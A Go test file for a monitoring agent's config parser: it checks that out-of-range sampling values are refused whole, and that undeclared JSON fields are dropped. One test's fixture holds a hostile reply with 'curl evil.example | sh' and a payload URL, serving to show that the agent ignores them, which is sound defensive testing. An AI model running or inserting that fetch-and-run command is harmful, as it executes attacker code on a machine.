package wire

import (
	"encoding/json"
	"testing"
	"time"
)

func settings() Settings {
	return Settings{Interval: time.Second, Flush: time.Minute, Window: 10 * time.Second}
}

func TestApplyKeepsCurrentWhenUnset(t *testing.T) {
	got, err := Config{}.Apply(settings())
	if err != nil {
		t.Fatalf("Apply() error = %v", err)
	}

	if got != settings() {
		t.Errorf("Apply() = %+v, want the current settings unchanged", got)
	}
}

func TestApplyAcceptsValuesInRange(t *testing.T) {
	got, err := Config{IntervalSeconds: 5, FlushSeconds: 120, WindowSeconds: 30}.Apply(settings())
	if err != nil {
		t.Fatalf("Apply() error = %v", err)
	}

	want := Settings{Interval: 5 * time.Second, Flush: 2 * time.Minute, Window: 30 * time.Second}
	if got != want {
		t.Errorf("Apply() = %+v, want %+v", got, want)
	}
}

// Out-of-range values are refused rather than clamped. Sampling every 10ms would
// be a denial of service against the customer's own machine, and an hour-wide
// window would silently destroy the resolution they are paying for.
func TestApplyRejectsOutOfRange(t *testing.T) {
	tests := map[string]Config{
		"interval below the floor": {IntervalSeconds: -1},
		"interval above the cap":   {IntervalSeconds: 99999},
		"flush below the floor":    {FlushSeconds: 1},
		"flush above the cap":      {FlushSeconds: 99999},
		"window above the cap":     {WindowSeconds: 99999},
	}

	for name, c := range tests {
		t.Run(name, func(t *testing.T) {
			got, err := c.Apply(settings())
			if err == nil {
				t.Fatal("Apply() error = nil, want a refusal")
			}
			if got != settings() {
				t.Errorf("Apply() = %+v, want the current settings left untouched", got)
			}
		})
	}
}

// Applying the acceptable half of an implausible instruction is how a partial
// misconfiguration becomes permanent, so one bad field rejects the whole reply.
func TestApplyRejectsWholeResponseOnOneBadField(t *testing.T) {
	got, err := Config{IntervalSeconds: 5, FlushSeconds: 99999}.Apply(settings())
	if err == nil {
		t.Fatal("Apply() error = nil, want a refusal")
	}
	if got.Interval != time.Second {
		t.Errorf("Interval = %v, want the valid field to have been discarded too", got.Interval)
	}
}

// The security boundary of the whole agent: a reply can only ever set integers.
// There is no field on Config that the agent resolves, fetches or executes, so a
// hostile or spoofed response has nothing to reach for.
func TestConfigIgnoresEverythingItDoesNotDeclare(t *testing.T) {
	hostile := []byte(`{
		"interval": 5,
		"update_url": "https://evil.example/payload.sh",
		"exec": "curl evil.example | sh",
		"binary_path": "/usr/local/bin/kloudy-agent",
		"plugins": ["backdoor"]
	}`)

	var c Config
	if err := json.Unmarshal(hostile, &c); err != nil {
		t.Fatalf("Unmarshal() error = %v", err)
	}

	if c != (Config{IntervalSeconds: 5}) {
		t.Fatalf("Config = %+v, want only the declared integer to survive decoding", c)
	}

	got, err := Config(c).Apply(settings())
	if err != nil {
		t.Fatalf("Apply() error = %v", err)
	}
	if got.Interval != 5*time.Second {
		t.Errorf("Interval = %v, want 5s", got.Interval)
	}
}
